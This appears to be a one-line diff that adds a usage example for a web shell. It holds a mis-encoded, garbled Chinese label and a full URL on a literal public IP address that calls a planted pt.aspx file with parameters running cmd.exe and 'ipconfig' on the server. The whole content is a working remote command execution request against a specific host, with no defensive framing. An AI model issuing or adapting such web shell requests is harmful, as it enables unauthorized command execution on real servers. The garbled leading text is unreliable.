@@ -1,0 +1,1 @@
+Ê¹ÓÃÀý×Ó£ºhttp://47.52.23.6/SiteFiles/TemporaryFiles/contents/pt.aspx?shell=c:\windows\system32\cmd.exe&cmd=ipconfig
